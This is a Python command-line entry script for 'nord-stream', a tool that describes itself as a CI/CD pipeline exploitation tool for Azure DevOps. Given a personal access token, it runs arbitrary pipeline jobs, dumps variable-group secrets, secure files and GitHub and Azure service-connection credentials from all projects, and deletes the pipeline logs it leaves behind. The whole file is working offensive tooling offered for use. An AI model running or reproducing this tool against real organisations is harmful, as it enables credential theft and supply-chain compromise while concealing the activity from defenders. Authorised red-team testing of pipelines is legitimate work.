"""
CICD pipeline exploitation tool

Usage:
    nord-stream.py devops [options] --token <pat> --org <org> [--project <project> --no-vg --no-gh --no-az --write-filter --no-clean]
    nord-stream.py devops [options] --token <pat> --org <org> --yaml <yaml> --project <project> [--write-filter --no-clean]
    nord-stream.py devops [options] --token <pat> --org <org> --build-yaml <output> --build-type <type>
    nord-stream.py devops [options] --token <pat> --org <org> --clean-logs [--project <project>]
    nord-stream.py devops [options] --token <pat> --org <org> --list-projects [--write-filter]
    nord-stream.py devops [options] --token <pat> --org <org> --list-secrets [--project <project> --write-filter]
    nord-stream.py devops [options] --token <pat> --org <org> --describe-token

Options:
    -h --help                               Show this screen.
    --version                               Show version.
    -v, --verbose                           Verbose mode
    -d, --debug                             Debug mode
    --output-dir <dir>                      Output directory for logs

args
    --token <pat>                           Azure DevOps personal token
    --org <org>                             Org name
    -p, --project <project>                 Run on selected project (can be a file)
    -y, --yaml <yaml>                       Run arbitrary job
    --clean-logs                            Delete all pipeline created by this tool. This operation is done by default but can be manually triggered.
    --no-clean                              Don't clean pipeline logs (default false)
    --no-vg                                 Don't extract variable groups secrets
    --no-sf                                 Don't extract secure files
    --no-gh                                 Don't extract GitHub service connection secrets
    --no-az                                 Don't extract Azure service connection secrets
    --list-projects                         List all projects.
    --list-secrets                          List all secrets.
    --write-filter                          Filter projects where current user has write or admin access.
    --build-yaml <output>                   Create a pipeline yaml file with default configuration.
    --build-type <type>                     Type used to generate the yaml file can be: default, azurerm, github
    --describe-token                        Display information on the token

Examples:
    List all secrets from all projects
    $ nord-stream.py devops --token "$PAT" --org myorg --list-secrets

    Dump all secrets from all projects
    $ nord-stream.py devops --token "$PAT" --org myorg

Authors: @hugow @0hexit
"""

from docopt import docopt
from nordstream.cicd.devops import DevOps
from nordstream.core.devops import DevOpsRunner
from nordstream.utils.log import logger, NordStreamLog


def start(argv):
    args = docopt(__doc__, argv=argv)

    if args["--verbose"]:
        NordStreamLog.setVerbosity(verbose=1)

    if args["--debug"]:
        NordStreamLog.setVerbosity(verbose=2)

    logger.debug(args)
    # check validity of the token
    if not DevOps.checkToken(args["--token"], args["--org"]):
        logger.critical("Invalid token or org.")

    # devops setup
    devops = DevOps(args["--token"], args["--org"])
    if args["--output-dir"]:
        devops.outputDir = args["--output-dir"] + "/"
    devopsRunner = DevOpsRunner(devops)

    if args["--yaml"]:
        devopsRunner.yaml = args["--yaml"]
    if args["--write-filter"]:
        devopsRunner.writeAccessFilter = args["--write-filter"]

    if args["--no-vg"]:
        devopsRunner.extractVariableGroups = not args["--no-vg"]
    if args["--no-sf"]:
        devopsRunner.extractSecureFiles = not args["--no-sf"]
    if args["--no-az"]:
        devopsRunner.extractAzureServiceconnections = not args["--no-az"]
    if args["--no-gh"]:
        devopsRunner.extractGitHubServiceconnections = not args["--no-gh"]
    if args["--no-clean"]:
        devopsRunner.cleanLogs = not args["--no-clean"]

    devopsRunner.getProjects(args["--project"])

    # logic
    if args["--describe-token"]:
        devopsRunner.describeToken()

    elif args["--list-projects"]:
        devopsRunner.listDevOpsProjects()

    elif args["--list-secrets"]:
        devopsRunner.listProjectSecrets()

    elif args["--clean-logs"]:
        devopsRunner.manualCleanLogs()

    elif args["--build-yaml"]:
        devopsRunner.output = args["--build-yaml"]
        devopsRunner.createYaml(args["--build-type"])

    else:
        devopsRunner.runPipeline()
